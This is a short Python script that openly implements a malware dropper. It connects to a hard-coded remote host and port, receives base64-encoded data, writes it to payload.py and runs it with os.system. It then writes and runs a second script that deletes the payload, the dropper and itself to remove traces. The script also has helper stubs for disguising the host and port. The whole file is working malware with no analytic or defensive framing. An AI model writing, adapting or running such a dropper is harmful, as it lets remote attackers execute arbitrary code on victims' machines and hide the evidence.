#!/usr/bin/env python3


import base64
import logging
import socket
import math
import os
from time import sleep


class Dropper:

    def __init__(self, hostname, port_num):

        self._host = hostname
        self._port = port_num
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def host(self):

        return self._host

    @host.setter
    def host(self, new_host):

        self._host = new_host

    def decode_hostname(self, str1, str2):

        return str2[::-1] + str1[::-1]

    @property
    def port(self):

        return self._port

    @port.setter
    def port(self, new_port):

        self._port = new_port

    def decode_port(self, port):

        return int(math.sqrt(port))

    @property
    def socket(self):

        return self._socket

    def dump_data(self, data):

        with open('payload.py', 'wb') as file:
            file.write(data)

    def download_malicious_code(self):

        try:
            self.socket.connect((self.host, self.port))

        except socket.error:
            logging.debug('Dropper could not connect to the server.')
            return

        command = self.socket.recv(100000)
        decode_payload = base64.b64decode(command)
        self.dump_data(decode_payload)
        os.system("python payload.py")
        self.clear_track()
        input()

    def clear_track(self):

        clear_data = "import os\ncur_dir=os.getcwd()\nos.remove(f'{cur_dir}\\\payload.py'\nos.remove(f'{cur_dir}\\\dropper.py')\nos.remove(f'{cur_dir}\\\clear.py')"
        cur_dir = os.getcwd()

        with open(f"{cur_dir}\\\clear.py", "a") as w_file:
            w_file.write(clear_data)

        os.system("python clear.py")
        print("Yes")


if __name__ == '__main__':

    logging.basicConfig(level=logging.DEBUG)

    dropper = Dropper('192.168.43.234', 27000)
    dropper.download_malicious_code()